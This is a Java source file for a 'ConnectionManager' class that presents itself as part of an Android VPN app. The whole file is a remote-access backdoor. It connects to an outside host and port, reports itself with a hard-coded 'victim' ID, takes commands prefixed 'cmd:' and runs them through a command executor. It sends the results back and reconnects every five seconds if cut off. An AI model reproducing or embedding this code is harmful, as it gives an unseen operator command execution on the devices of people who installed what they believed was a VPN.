package com.markos.vpn;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class ConnectionManager {
    private static final String SERVER_IP = "gfdxf.serv00.net";
    private static final int SERVER_PORT = 10457;
    private static final String VICTIM_ID = "android_vpn_001";

    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private boolean isConnected = false;
    private CommandExecutor executor = new CommandExecutor();

    public void connect() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (!isConnected) {
                    try {
                        socket = new Socket(SERVER_IP, SERVER_PORT);
                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        out = new PrintWriter(socket.getOutputStream(), true);
                        isConnected = true;
                        out.println(VICTIM_ID + ":connected");

                        String line;
                        while ((line = in.readLine()) != null) {
                            if (line.startsWith("cmd:")) {
                                String cmd = line.substring(4);
                                String result = executor.execute(cmd);
                                out.println("result:" + result);
                            }
                        }
                    } catch (Exception e) {
                        isConnected = false;
                        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                    }
                }
            }
        }).start();
    }

    public void disconnect() {
        try {
            isConnected = false;
            if (socket != null) socket.close();
        } catch (Exception ignored) {}
    }
}
